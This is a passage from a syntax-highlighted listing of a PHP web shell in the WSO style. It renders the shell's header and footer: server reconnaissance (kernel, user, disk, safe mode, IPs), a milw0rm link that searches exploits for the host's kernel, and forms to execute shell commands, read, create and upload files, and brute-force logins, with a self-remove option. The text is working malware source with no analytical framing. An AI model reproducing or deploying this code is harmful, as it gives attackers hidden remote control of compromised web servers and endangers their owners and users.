<span class="lineno"> 198</span> <span class="x">                eval(arr[2].substr(0, arr[1])); </span>
<span class="lineno"> 199</span> <span class="x">            }  </span>
<span class="lineno"> 200</span> <span class="x">            else alert(&quot;Request error!&quot;); </span>
<span class="lineno"> 201</span> <span class="x">    } </span>
<span class="lineno"> 202</span> <span class="x">&lt;/script&gt; </span>
<span class="lineno"> 203</span> <span class="x">&lt;head&gt;&lt;body&gt;&lt;div style=&quot;position:absolute;width:100%;top:0;left:0;&quot;&gt; </span>
<span class="lineno"> 204</span> <span class="x">&lt;form method=post name=mf style=&#39;display:none;&#39;&gt; </span>
<span class="lineno"> 205</span> <span class="x">&lt;input type=hidden name=a value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 206</span> <span class="x">&lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 207</span> <span class="x">&lt;input type=hidden name=p1 value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 208</span> <span class="x">&lt;input type=hidden name=p2 value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 209</span> <span class="x">&lt;input type=hidden name=p3 value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 210</span> <span class="x">&lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 211</span> <span class="x">&lt;/form&gt; </span>
<span class="lineno"> 212</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 213</span>     <span class="nv">$freeSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">diskfreespace</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
<span class="lineno"> 214</span>     <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
<span class="lineno"> 215</span>     <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="nv">$totalSpace</span><span class="o">?</span><span class="nv">$totalSpace</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> 
<span class="lineno"> 216</span>     <span class="nv">$release</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno"> 217</span>     <span class="nv">$kernel</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">);</span> 
<span class="lineno"> 218</span>     <span class="nv">$millink</span><span class="o">=</span><span class="s1">&#39;http://milw0rm.com/search.php?dong=&#39;</span><span class="p">;</span> 
<span class="lineno"> 219</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="s1">&#39;Linux&#39;</span><span class="p">,</span> <span class="nv">$kernel</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> 
<span class="lineno"> 220</span>         <span class="nv">$millink</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span> <span class="s1">&#39;Linux Kernel &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="p">);</span> 
<span class="lineno"> 221</span>     <span class="k">else</span> 
<span class="lineno"> 222</span>         <span class="nv">$millink</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span> <span class="nv">$kernel</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="p">);</span> 
<span class="lineno"> 223</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getegid&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 224</span>         <span class="nv">$user</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span> 
<span class="lineno"> 225</span>         <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmyuid</span><span class="p">();</span> 
<span class="lineno"> 226</span>         <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span> 
<span class="lineno"> 227</span>         <span class="nv">$group</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span> 
<span class="lineno"> 228</span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
<span class="lineno"> 229</span>         <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_geteuid</span><span class="p">());</span> 
<span class="lineno"> 230</span>         <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_getegid</span><span class="p">());</span> 
<span class="lineno"> 231</span>         <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> 
<span class="lineno"> 232</span>         <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span> 
<span class="lineno"> 233</span>         <span class="nv">$group</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> 
<span class="lineno"> 234</span>         <span class="nv">$gid</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span> 
<span class="lineno"> 235</span>     <span class="p">}</span> 
<span class="lineno"> 236</span>     <span class="nv">$cwd_links</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 237</span>     <span class="nv">$path</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
<span class="lineno"> 238</span>     <span class="nv">$n</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span> 
<span class="lineno"> 239</span>     <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$n</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 240</span>         <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 241</span>         <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;=</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span> 
<span class="lineno"> 242</span>             <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span> 
<span class="lineno"> 243</span>         <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;&quot;</span><span class="o">.</span><span class="nv">$path</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&lt;/a&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 244</span>     <span class="p">}</span> 
<span class="lineno"> 245</span>     <span class="nv">$charsets</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;Windows-1251&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-R&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-U&#39;</span><span class="p">,</span> <span class="s1">&#39;cp866&#39;</span><span class="p">);</span> 
<span class="lineno"> 246</span>     <span class="nv">$opt_charsets</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 247</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$charsets</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> 
<span class="lineno"> 248</span>         <span class="nv">$opt_charsets</span> <span class="o">.=</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$item</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$item</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt;&#39;</span><span class="o">.</span><span class="nv">$item</span><span class="o">.</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 249</span>     <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Sec. Info&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;SecInfo&#39;</span><span class="p">,</span><span class="s1">&#39;Files&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;FilesMan&#39;</span><span class="p">,</span><span class="s1">&#39;Console&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Console&#39;</span><span class="p">,</span><span class="s1">&#39;Sql&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Sql&#39;</span><span class="p">,</span><span class="s1">&#39;Php&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Php&#39;</span><span class="p">,</span><span class="s1">&#39;Safe mode&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;SafeMode&#39;</span><span class="p">,</span><span class="s1">&#39;String tools&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;StringTools&#39;</span><span class="p">,</span><span class="s1">&#39;Bruteforce&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Bruteforce&#39;</span><span class="p">,</span><span class="s1">&#39;Network&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Network&#39;</span><span class="p">);</span> 
<span class="lineno"> 250</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;auth_pass&#39;</span><span class="p">]))</span> 
<span class="lineno"> 251</span>     <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Logout&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;Logout&#39;</span><span class="p">;</span> 
<span class="lineno"> 252</span>     <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Self remove&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SelfRemove&#39;</span><span class="p">;</span> 
<span class="lineno"> 253</span>     <span class="nv">$menu</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 254</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno"> 255</span>         <span class="nv">$menu</span> <span class="o">.=</span> <span class="s1">&#39;&lt;th width=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="mi">100</span><span class="o">/</span><span class="nb">count</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;%&quot;&gt;[ &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt; ]&lt;/th&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 256</span>     <span class="nv">$drives</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
<span class="lineno"> 257</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 258</span>         <span class="k">foreach</span><span class="p">(</span> <span class="nb">range</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$drive</span> <span class="p">)</span> 
<span class="lineno"> 259</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:\\&#39;</span><span class="p">))</span> 
<span class="lineno"> 260</span>             <span class="nv">$drives</span> <span class="o">.=</span> <span class="s1">&#39;&lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:/\&#39;)&quot;&gt;[ &#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39; ]&lt;/a&gt; &#39;</span><span class="p">;</span> 
<span class="lineno"> 261</span>     <span class="p">}</span> 
<span class="lineno"> 262</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;table class=info cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td width=1&gt;&lt;span&gt;Uname&lt;br&gt;User&lt;br&gt;Php&lt;br&gt;Hdd&lt;br&gt;Cwd&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="o">?</span><span class="s1">&#39;&lt;br&gt;Drives&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/span&gt;&lt;/td&gt;&#39;</span><span class="o">.</span> 
<span class="lineno"> 263</span>          <span class="s1">&#39;&lt;td&gt;:&lt;nobr&gt;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="o">@</span><span class="nb">php_uname</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">120</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;  &lt;a href=&quot;http://www.google.com/search?q=&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="o">@</span><span class="nb">php_uname</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;&quot; target=&quot;_blank&quot;&gt;[Google]&lt;/a&gt; &lt;a href=&quot;&#39;</span><span class="o">.</span><span class="nv">$millink</span><span class="o">.</span><span class="s1">&#39;&quot; target=_blank&gt;[milw0rm]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s1">&#39; ( &#39;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s1">&#39; ) &lt;span&gt;Group:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="o">.</span><span class="s1">&#39; ( &#39;</span><span class="o">.</span><span class="nv">$group</span><span class="o">.</span><span class="s1">&#39; )&lt;br&gt;:&#39;</span><span class="o">.@</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Safe mode:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;&lt;font color=red&gt;ON&lt;/font&gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&lt;font color=&lt;?=$color?&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &lt;a href=# onclick=&quot;g(\&#39;Php\&#39;,null,null,\&#39;info\&#39;)&quot;&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nx">viewSize</span><span class="p">(</span><span class="nv">$totalSpace</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Free:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nx">viewSize</span><span class="p">(</span><span class="nv">$freeSpace</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.</span><span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$freeSpace</span><span class="o">/</span><span class="nv">$totalSpace</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;%)&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nv">$cwd_links</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nx">viewPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;a href=# onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;home_cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&gt;[ home ]&lt;/a&gt;&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nv">$drives</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="o">.</span> 
<span class="lineno"> 264</span>          <span class="s1">&#39;&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange=&quot;g(null,null,null,null,null,this.value)&quot;&gt;&lt;optgroup label=&quot;Page charset&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$opt_charsets</span><span class="o">.</span><span class="s1">&#39;&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;&#39;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span><span class="o">.</span> 
<span class="lineno"> 265</span>          <span class="s1">&#39;&lt;table cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&#39;</span><span class="o">.</span><span class="nv">$menu</span><span class="o">.</span><span class="s1">&#39;&lt;/tr&gt;&lt;/table&gt;&lt;div style=&quot;margin:5&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 266</span> <span class="p">}</span> 
<span class="lineno"> 267</span> 
<span class="lineno"> 268</span> <span class="k">function</span> <span class="nf">printFooter</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 269</span>     <span class="nv">$is_writable</span> <span class="o">=</span> <span class="nb">is_writable</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">?</span><span class="s2">&quot;&lt;font color=green&gt;[ Writeable ]&lt;/font&gt;&quot;</span><span class="o">:</span><span class="s2">&quot;&lt;font color=red&gt;[ Not writable ]&lt;/font&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 270</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 271</span> <span class="x">&lt;/div&gt; </span>
<span class="lineno"> 272</span> <span class="x">&lt;table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%&quot;&gt; </span>
<span class="lineno"> 273</span> <span class="x">    &lt;tr&gt; </span>
<span class="lineno"> 274</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(null,this.c.value);return false;&quot;&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=c value=&quot;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;/td&gt; </span>
<span class="lineno"> 275</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;FilesTools&#39;,null,this.f.value);return false;&quot;&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=f&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;/td&gt; </span>
<span class="lineno"> 276</span> <span class="x">    &lt;/tr&gt; </span>
<span class="lineno"> 277</span> <span class="x">    &lt;tr&gt; </span>
<span class="lineno"> 278</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;FilesMan&#39;,null,&#39;mkdir&#39;,this.d.value);return false;&quot;&gt;&lt;span&gt;Make dir:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=d&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$is_writable</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno"> 279</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;FilesTools&#39;,null,this.f.value,&#39;mkfile&#39;);return false;&quot;&gt;&lt;span&gt;Make file:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=f&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$is_writable</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno"> 280</span> <span class="x">    &lt;/tr&gt; </span>
<span class="lineno"> 281</span> <span class="x">    &lt;tr&gt; </span>
<span class="lineno"> 282</span> <span class="x">        &lt;td&gt;&lt;form onsubmit=&quot;g(&#39;Console&#39;,null,this.c.value);return false;&quot;&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=text name=c value=&quot;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;/td&gt; </span>
<span class="lineno"> 283</span> <span class="x">        &lt;td&gt;&lt;form method=&#39;post&#39; ENCTYPE=&#39;multipart/form-data&#39;&gt; </span>
<span class="lineno"> 284</span> <span class="x">        &lt;input type=hidden name=a value=&#39;FilesMAn&#39;&gt; </span>
<span class="lineno"> 285</span> <span class="x">        &lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 286</span> <span class="x">        &lt;input type=hidden name=p1 value=&#39;uploadFile&#39;&gt; </span>
<span class="lineno"> 287</span> <span class="x">        &lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 288</span> <span class="x">        &lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class=&quot;toolsInp&quot; type=file name=f&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$is_writable</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno"> 289</span> <span class="x">    &lt;/tr&gt; </span>
<span class="lineno"> 290</span> 
<span class="lineno"> 291</span> <span class="x">&lt;/table&gt; </span>
<span class="lineno"> 292</span> <span class="x">&lt;/div&gt; </span>
<span class="lineno"> 293</span> <span class="x">&lt;/body&gt;&lt;/html&gt; </span>
<span class="lineno"> 294</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 295</span> <span class="p">}</span> 
<span class="lineno"> 296</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getpwuid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
